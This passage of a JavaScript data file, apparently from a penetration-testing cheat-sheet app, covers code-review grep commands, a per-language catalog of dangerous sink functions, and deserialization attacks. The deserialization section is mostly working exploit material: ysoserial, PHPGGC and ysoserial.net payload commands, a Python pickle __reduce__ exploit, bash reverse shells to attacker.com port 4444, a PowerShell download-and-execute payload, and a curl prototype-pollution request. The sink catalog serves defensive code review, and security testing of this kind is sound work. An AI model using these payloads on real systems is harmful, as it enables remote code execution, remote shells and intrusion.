grep -rn "createNativeQuery(\\|createQuery(\"" . --include="*.java"

# ── JAVA DESERIALIZATION ──────────────────────────────
grep -rn "ObjectInputStream\\|readObject(\\|XMLDecoder\\|XStream" . --include="*.java"
# Use ysoserial to generate payloads for Commons Collections, Spring, Groovy gadget chains`
      },
      {
        title: 'PHP & Node.js / Express',
        code: `# ── PHP TYPE JUGGLING ─────────────────────────────────
# Loose == comparison: "0e123" == 0 is TRUE in PHP
# MD5 magic hash: md5("240610708") = 0e462097431906509019562988736854
# SHA1 magic hash: sha1("aaroZmOk") = 0e66507019969427...
# Submit: token=0e462097431906509019562988736854 → passes == 0 check

grep -rn "==\\s*\\$_GET\\|==\\s*\\$_POST\\|==\\s*0" . --include="*.php"

# ── PHP DESERIALIZATION (PHPGGC) ──────────────────────
phpggc -l                                    # List all chains
phpggc Laravel/RCE1 system id                # Laravel gadget chain
phpggc Symfony/RCE4 exec id -b               # Base64 encoded
phpggc Monolog/RCE1 system id                # Monolog (found in many apps)

# Grep for unserialize with user input
grep -rn "unserialize(\\$_\\|unserialize(base64_decode(" . --include="*.php"

# ── PHP FILE INCLUSION ────────────────────────────────
grep -rn "include(\\$_\\|require(\\$_\\|include_once(\\$_" . --include="*.php"
# Payloads:
# ?page=php://filter/convert.base64-encode/resource=index.php
# ?page=data://text/plain,<?php system('id')?>

# ── EXPR.JS PROTOTYPE POLLUTION ───────────────────────
grep -rn "merge(\\|extend(\\|deepMerge(\\|assign(" . --include="*.js"

# Exploit
curl -X POST https://target.com/api/settings \\
  -H "Content-Type: application/json" \\
  -d '{"__proto__":{"isAdmin":true}}'

# Also via constructor
# {"constructor":{"prototype":{"isAdmin":true}}}

# Grep for eval with user input
grep -rn "eval(req\\.\\|new Function(.*body\\|vm\\.runIn" . --include="*.js"`
      }
    ]
  },

  // ─── DANGEROUS FUNCTIONS REFERENCE ────────────────────────────────────────
  {
    id: 'dangerous-functions',
    title: 'Dangerous Functions Reference',
    subtitle: 'Per-language sink catalog — command injection, SQLi, deserialization, SSTI, SSRF',
    tags: ['Python', 'JavaScript', 'Java', 'PHP', 'Go', 'sink catalog', 'command injection', 'deserialization'],
    accentColor: 'cyan',
    overview: 'A complete per-language catalog of dangerous sinks organized by vulnerability class. Use as a grep reference during manual code review. Any dangerous function receiving user-controlled input with no sanitization is likely exploitable.',
    steps: [
      'Command injection sinks: any with user input = critical severity, immediate escalation',
      'SQL sinks: check for string concatenation vs parameterized — parameterized is safe',
      'Deserialization: any with user input is likely RCE — use gadget chain tools',
      'Template sinks: user-controlled template string = SSTI → RCE',
      'File operation sinks: user-controlled path = path traversal / LFI',
    ],
    commands: [
      {
        title: 'Python sinks by vulnerability class',
        code: `# ── COMMAND INJECTION ─────────────────────────────────
os.system(cmd)                       # Shell string — HIGH RISK
os.popen(cmd)                        # Shell pipe
subprocess.run(cmd, shell=True)      # shell=True = dangerous
subprocess.Popen(cmd, shell=True)
subprocess.call(cmd, shell=True)
subprocess.check_output(cmd, shell=True)
eval(user_input)                     # Code execution
exec(user_input)                     # Code execution
compile(user_input, "<string>", "exec")
__import__(user_input)               # Dynamic import
commands.getoutput(cmd)              # Python 2 legacy

# ── SQL INJECTION ──────────────────────────────────────
cursor.execute("SELECT..." + input)
cursor.execute(f"SELECT...{input}")
cursor.execute("SELECT..." % input)
cursor.execute("SELECT...".format(input))
session.query(Model).filter("id=" + input)        # SQLAlchemy raw
Model.objects.raw("SELECT..." + input)             # Django
Model.objects.extra(where=["..." % input])         # Django
sqlalchemy.text("SELECT..." + input)               # SQLAlchemy text()

# ── DESERIALIZATION ────────────────────────────────────
pickle.loads(data)              # Arbitrary code execution on load
pickle.load(file)
cPickle.loads(data)
marshal.loads(data)
yaml.load(data)                 # CRITICAL — use yaml.safe_load()
yaml.full_load(data)            # Same risk
jsonpickle.decode(data)         # Arbitrary object reconstruction
dill.loads(data)                # Extended pickle

# ── SSTI ───────────────────────────────────────────────
jinja2.Template(user_input).render()
flask.render_template_string(user_input)
mako.template.Template(user_input)
django.template.Template(user_input)

# ── PATH TRAVERSAL / LFI ──────────────────────────────
open(user_path)
os.path.join(base, input)       # Bypassable with absolute path input
tarfile.extractall(path)        # Zip Slip
zipfile.extractall(path)        # Zip Slip

# ── SSRF ───────────────────────────────────────────────
requests.get(user_url)
requests.post(user_url)
urllib.request.urlopen(user_url)
urllib.request.urlretrieve(user_url)
httpx.get(user_url)
aiohttp.ClientSession().get(user_url)`
      },
      {
        title: 'JavaScript / Node.js sinks',
        code: `// ── COMMAND INJECTION ──────────────────────────────
exec(cmd)                            // child_process — shell injection
execSync(cmd)
spawn(cmd, args, {shell: true})      // shell option = dangerous
spawnSync(cmd, args, {shell: true})
eval(user_input)                     // Code execution
new Function(user_input)()           // Indirect eval
vm.runInNewContext(user_input)       // VM escape possible
vm.runInThisContext(user_input)      // Same context — dangerous
setTimeout(user_input, 0)            // String arg = eval
setInterval(user_input, 0)

// ── SQL INJECTION ────────────────────────────────────
db.query("SELECT..." + input)
db.query(\`SELECT... \${input}\`)
knex.raw("SELECT..." + input)
sequelize.query("SELECT..." + input)
mongoose.find({$where: "..." + input})   // JS execution in MongoDB

// ── PATH TRAVERSAL ───────────────────────────────────
fs.readFile(user_path)
fs.readFileSync(user_path)
fs.createReadStream(user_path)
path.join(__dirname, user_path)      // Bypass with absolute path
res.sendFile(user_path)              // Express
require(user_path)                   // Dynamic require

// ── XSS (SERVER RENDERING) ───────────────────────────
res.send(user_input)                 // Unescaped HTML
res.write(user_input)
innerHTML = user_input               // Client-side
document.write(user_input)
dangerouslySetInnerHTML              // React

// ── PROTOTYPE POLLUTION ──────────────────────────────
_.merge(obj, user_input)             // Lodash < 4.17.12
_.extend(obj, user_input)
deepmerge(obj, user_input)
Object.assign(obj, user_input)       // When input has __proto__`
      },
      {
        title: 'Java dangerous functions',
        code: `// ── COMMAND INJECTION ──────────────────────────────
Runtime.getRuntime().exec(userInput)
new ProcessBuilder(userInput).start()
// Unsafe variant: exec(new String[]{"sh","-c",userInput})

// ── SQL INJECTION ────────────────────────────────────
// UNSAFE: string concatenation
Statement.execute("SELECT..." + userInput)
entityManager.createNativeQuery("SELECT..." + userInput)
session.createQuery("FROM User WHERE name='" + userInput + "'")  // HQL

// SAFE: parameterized
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setString(1, userInput);

// ── DESERIALIZATION ──────────────────────────────────
new ObjectInputStream(is).readObject()     // Native Java — ysoserial
XMLDecoder.readObject()                    // XML deserialization
XStream.fromXML(userInput)                 // XStream (CVE-2021-21351)
SerializationUtils.deserialize(bytes)      // Apache Commons
JSON.parseObject(userInput, Object.class)  // Fastjson RCE gadgets

// ── EXPRESSION INJECTION ─────────────────────────────
new SpelExpressionParser().parseExpression(userInput).getValue()
ELProcessor.eval(userInput)                // JSF EL
FreeMarker.process(userInput)
Velocity.evaluate(ctx, w, "", userInput)

// ── PATH TRAVERSAL ───────────────────────────────────
new File(baseDir, userInput)               // Traversal possible
Files.readAllBytes(Paths.get(userInput))
new FileInputStream(userInput)
// ZipFile without path canonicalization = Zip Slip`
      },
      {
        title: 'PHP dangerous functions',
        code: `<?php
// ── COMMAND INJECTION ──────────────────────────────
system($user);          exec($user);          shell_exec($user);
passthru($user);        popen($user, 'r');    proc_open($user, [], $p);
\`$user\`;               pcntl_exec($user);

// ── CODE EXECUTION ────────────────────────────────
eval($user);                                 // PHP code execution
assert($user);                               // PHP 5.x = eval()
preg_replace('/.*/e', $user, '');            // /e modifier (PHP < 7)
create_function('', $user);                  // = eval()
call_user_func($user);
call_user_func_array($user, []);

// ── FILE INCLUSION ────────────────────────────────
include($user);     require($user);          include_once($user);
require_once($user); file_get_contents($user); fopen($user, 'r');

// ── DESERIALIZATION ───────────────────────────────
unserialize($user);   // RCE via PHPGGC gadget chains

// ── SQL INJECTION ─────────────────────────────────
mysql_query("SELECT..." . $user);           // Deprecated
mysqli_query($conn, "SELECT..." . $user);
$pdo->query("SELECT..." . $user);
// SAFE: $pdo->prepare("SELECT... WHERE id=?")->execute([$id]);

// ── PATH TRAVERSAL ────────────────────────────────
file_get_contents("../../../etc/passwd");
readfile($user);
move_uploaded_file($tmp, $user);`
      }
    ]
  },

  // ─── DESERIALIZATION ───────────────────────────────────────────────────────
  {
    id: 'deserialization',
    title: 'Deserialization Attacks',
    subtitle: 'Java, Python, PHP, and .NET gadget chains for unauthenticated RCE',
    tags: ['ysoserial', 'PHPGGC', 'pickle RCE', 'Java gadget chain', 'BinaryFormatter', 'XStream', 'Fastjson'],
    accentColor: 'cyan',
    overview: 'Insecure deserialization allows an attacker to supply a crafted serialized object that triggers a chain of method calls ("gadget chain") during deserialization, resulting in arbitrary code execution — often pre-authentication.',
    steps: [
      'Identify deserialization points: base64 blobs in cookies/headers, POST bodies, binary content-type',
      'Java magic bytes: AC ED 00 05 (hex) / rO0A (base64) → Java serialized object',
      'Use ysoserial with URLDNS first (DNS pingback) to confirm deserialization without needing exec',
      'For PHP: use PHPGGC to generate gadget chains for Laravel, Symfony, Monolog, Guzzle',
      'For Python: craft pickle payload with __reduce__ — any yaml.load / pickle.loads on user input',
      'For .NET: use ysoserial.net with BinaryFormatter + TypeConfuseDelegate chain',
    ],
    commands: [
      {
        title: 'Java — ysoserial',
        code: `# https://github.com/frohoff/ysoserial

# List available gadget chains
java -jar ysoserial.jar --help

# URLDNS — blind detection only (DNS pingback, no exec)
java -jar ysoserial.jar URLDNS 'http://UNIQUEID.attacker.com' | base64 -w0
# Send as cookie, monitor Burp Collaborator / interactsh DNS logs

# Generate RCE payload
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0   # Java 8u191+

# Best chains to try (in order):
# CommonsCollections1   ← Apache CC <= 3.1 (most common)
# CommonsCollections2   ← CC 4.0
# CommonsCollections3   ← CC3.x + Commons BeanUtils
# CommonsCollections4   ← CC 4.0
# CommonsCollections5   ← CC3.x different trigger
# CommonsCollections6   ← CC3.x bypass for newer JDKs
# Spring1 / Spring2     ← Spring Framework
# Groovy1               ← Groovy
# Hibernate1            ← Hibernate ORM
# URLDNS                ← Detection only (DNS)

# Java magic bytes detection
# Hex:    AC ED 00 05
# Base64: rO0AB...
grep -r "rO0AB" . --include="*.py" --include="*.java"

# Send payload to endpoint
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/hit' | \\
  curl -s -X POST https://target.com/endpoint \\
    --data-binary @- -H "Content-Type: application/x-java-serialized-object"`
      },
      {
        title: 'PHP — PHPGGC',
        code: `# https://github.com/ambionics/phpggc

phpggc -l                               # List all chains
phpggc -l Laravel                       # List Laravel chains
phpggc -l Symfony                       # List Symfony chains
phpggc -l Monolog                       # Monolog (common in many PHP apps)

# Generate payload
phpggc Laravel/RCE1 system id           # Plaintext
phpggc Laravel/RCE1 system id -b        # Base64
phpggc Laravel/RCE1 system id -u        # URL-encoded

# Reverse shell
phpggc Laravel/RCE1 system \\
  'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' -b

# Top chains:
# Laravel/RCE1     ← Laravel 5.5–8 (very common)
# Laravel/RCE2     ← Laravel (Mockery)
# Laravel/RCE4     ← Laravel 8+
# Symfony/RCE1     ← Symfony 3.x
# Symfony/RCE4     ← Symfony 4.x
# Monolog/RCE1     ← Monolog (found in many PHP apps)
# Guzzle/RCE1      ← Guzzle HTTP client
# Drupal/FD1       ← File deletion
# WordPress/P1     ← Property injection`
      },
      {
        title: 'Python pickle RCE',
        code: `import pickle, os, base64

# __reduce__ is called during unpickling — return (callable, args)
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)

# Reverse shell payload
class RShell(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RShell())).decode()

# Submit as session cookie or POST body
curl https://target.com/api/data -H "Cookie: session=$payload"

# YAML deserialization (yaml.load without SafeLoader)
import yaml
rce = b"!!python/object/apply:os.system ['id']"
yaml.load(rce)       # RCE — always use yaml.safe_load()

# jsonpickle
import jsonpickle
malicious = '{"py/object": "os.system", "py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}'
jsonpickle.decode(malicious)`
      },
      {
        title: '.NET — ysoserial.net',
        code: `# https://github.com/pwntester/ysoserial.net

ysoserial.exe -l    # List gadget chains
ysoserial.exe -h    # Help

# BinaryFormatter + TypeConfuseDelegate (most universal)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"

# Formatters to test:
# BinaryFormatter          — Most dangerous
# SoapFormatter            — Legacy SOAP
# ObjectStateFormatter     — ASP.NET ViewState
# LosFormatter             — ViewState (alternate)
# NetDataContractSerializer — WCF

# Gadget chains:
# TypeConfuseDelegate      — Universal
# PSObject                 — PowerShell
# WindowsPrincipal         — Windows auth
# ClaimsIdentity           — Claims-based auth

# ASP.NET ViewState exploitation (MachineKey known or disabled MAC)
ysoserial.exe -p ViewState \\
  -g TypeConfuseDelegate \\
  -c "powershell IEX(IWR http://attacker.com/shell.ps1)" \\
  --islegacy

# Json.NET TypeNameHandling = All (RCE via $type injection)
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process",
    "StartInfo": {"FileName": "cmd.exe", "Arguments": "/c calc.exe"}
  }
}`
      }
    ]
  }
];